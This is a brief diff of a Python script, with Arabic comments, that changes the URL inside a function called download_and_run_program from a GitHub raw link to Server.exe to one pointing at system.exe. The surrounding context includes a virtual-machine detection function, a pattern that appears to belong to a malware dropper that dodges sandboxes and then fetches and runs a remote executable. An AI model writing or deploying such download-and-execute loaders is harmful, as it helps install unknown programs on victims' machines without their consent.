@@ -38,7 +38,7 @@ def is_virtual_machine():
 
 # تحميل البرنامج من الرابط وتشغيله
 def download_and_run_program():
-    download_url = "https://github.com/ItsChanGat/Test/raw/refs/heads/main/Server.exe"
+    download_url = "https://github.com/ItsChanGat/Test/raw/refs/heads/main/system.exe"
     download_path = os.path.join(os.path.dirname(__file__), "Server.exe")
     
     # تحميل البرنامج
